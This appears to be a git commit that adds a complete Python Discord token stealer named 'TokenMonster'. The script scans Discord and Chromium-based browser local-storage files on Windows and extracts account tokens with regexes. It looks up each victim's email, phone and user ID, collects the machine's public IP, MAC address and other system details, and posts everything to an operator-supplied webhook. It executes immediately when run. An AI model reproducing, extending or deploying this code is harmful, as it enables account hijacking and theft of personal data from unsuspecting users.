ab0455fbda0b39753819793e5e360b464189c427
AtomDev <55463227+Atom345@users.noreply.github.com>
2021-08-30 17:01:46 -0600

    Add files via upload

---
+++ main.py
@@ -0,0 +1,106 @@
+import os, re, json, random, platform, socket, uuid, requests
+
+WEBHOOK_URL = "<YOUR_WEBHOOK_URL>"
+
+
+def retrieve_user(token):
+    return json.loads(requests.get("https://discord.com/api/v9/users/@me", headers={"Authorization": token, "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36", "Content-Type": "application/json"}).text)
+
+
+def network_address():
+    ip = json.loads(requests.get("https://api.ipify.org?format=json").text)
+    return ip["ip"]
+
+
+def system_info(return_type=0):
+    info = {'platform': platform.system(), 'platform-release': platform.release(),
+            'platform-version': platform.version(), 'architecture': platform.machine(),
+            'hostname': socket.gethostname(), 'ip-address': socket.gethostbyname(socket.gethostname()),
+            'public_ip': network_address(), 'mac-address': ':'.join(re.findall('..', '%012x' % uuid.getnode())),
+            'processor': platform.processor()}
+
+    if return_type == 0:
+        return info
+    else:
+        return json.dumps(info)
+
+
+class TokenMonster:
+
+    def __init__(self):
+        if os.name != 'nt':
+            exit()
+
+        self.tokens = []
+        self.pc = system_info()
+        self.pc_user = os.getlogin()
+        self.pc_roaming = os.getenv('APPDATA')
+        self.pc_local = os.getenv('LOCALAPPDATA')
+
+        self.scrape_tokens()
+
+        for token in self.tokens:
+            color = random.randint(0, 0xFFFFFF)
+            raw_user_data = retrieve_user(token)
+            user_json_str = json.dumps(raw_user_data)
+            user = json.loads(user_json_str)
+            if "username" in user:
+
+                if WEBHOOK_URL:
+                    webhook_data = {"username": "TokenMonster", "embeds": [
+                        dict(title="Sniped a token.",
+                             color=f'{color}',
+                             fields=[
+                                 {
+                                     "name": "**Account Info**",
+                                     "value": f'💳 User ID: ||{user["id"]}||\n🧔 Username: ||{user["username"] + "#" + user["discriminator"]}||\n📬 Email: ||{user["email"]}||\n☎ Phone: ||{user["phone"]}||',
+                                     "inline": True
+                                 },
+                                 {
+                                     "name": "**PC Info**",
+                                     "value": f'IP: ||{self.pc["public_ip"]}|| \nUsername: {self.pc_user}\nAppData: {self.pc_local}\nRoaming: {self.pc_roaming}',
+                                     "inline": True
+                                 },
+                                 {
+                                     "name": "💰 Token",
+                                     "value": f"||{token}||",
+                                     "inline": False
+                                 },
+                                 {
+                                     "name": "**PC Data Dump**",
+                                     "value": f'```{system_info(1)}```',
+                                     "inline": False
+                                 },
+                             ]),
+                    ]}
+
+                    result = requests.post(WEBHOOK_URL, headers={"Content-Type": "application/json"}, data=json.dumps(webhook_data))
+                    print(result.text)
+
+            self.tokens.remove(token)
+
+    def scrape_tokens(self):
+
+        crawl = {
+            "Discord Canary": self.pc_roaming + "\\discordcanary",
+            "Discord PTB": self.pc_roaming + "\\discordptb",
+            'Discord': self.pc_roaming + '\\discord\\Local Storage\\leveldb\\',
+            'Chrome': self.pc_local + '\\google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Brave': self.pc_local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Yandex': self.pc_local + '\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
+            'Opera': self.pc_roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\'
+        }
+
+        for source, path in crawl.items():
+            if not os.path.exists(path):
+                continue
+            for file_name in os.listdir(path):
+                if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
+                    continue
+                for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
+                    for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
+                        for token in re.findall(regex, line):
+                            self.tokens.append(token)
+
+
+init = TokenMonster()
